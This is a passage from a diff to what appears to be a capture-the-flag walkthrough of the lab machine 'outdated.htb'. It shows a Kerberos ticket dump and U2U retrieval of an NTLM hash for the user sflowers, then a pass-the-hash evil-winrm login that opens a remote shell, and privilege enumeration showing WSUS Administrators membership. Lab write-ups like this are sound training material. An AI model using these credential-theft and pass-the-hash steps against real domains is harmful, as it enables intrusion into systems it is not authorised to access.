+      CRp5Fhri+QTAVZqubMtvIvCjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES
+      BBAJOoQNrELxyAy0lQZc46uToQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD
+      BQBA4QAApREYDzIwMjQwNzI5MTEyNzUzWqYRGA8yMDI0MDcyOTIxMjc1M1qnERgPMjAyNDA4MDUxMTI3
+      NTNaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
+
+  ServiceName              :  krbtgt/outdated.htb
+  ServiceRealm             :  OUTDATED.HTB
+  UserName                 :  sflowers (NT_PRINCIPAL)
+  UserRealm                :  OUTDATED.HTB
+  StartTime                :  7/29/2024 4:27:53 AM
+  EndTime                  :  7/29/2024 2:27:53 PM
+  RenewTill                :  8/5/2024 4:27:53 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  CTqEDaxC8cgMtJUGXOOrkw==
+  ASREP (key)              :  6994D27A0B75C9089D0B66A2A3F60917
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
+```
+
+| Username | Password | Target |
+| -- | -- | -- |
+| sflowers | 1FCDB1F6015DCB318CC77BB2BDA14DB5 | outdated.htb |
+
+```bash
+$ evil-winrm -i $TARGET -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5            
+Evil-WinRM shell v3.5
+...                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sflowers\Documents> 
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Users\sflowers\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+outdated\sflowers S-1-5-21-4089647348-67660539-4016542185-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ===============================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+OUTDATED\WSUS Administrators                Alias            S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
+`sflowers` is member of `OUTDATED\WSUS Administrators`.
 
 ```bash
 ```
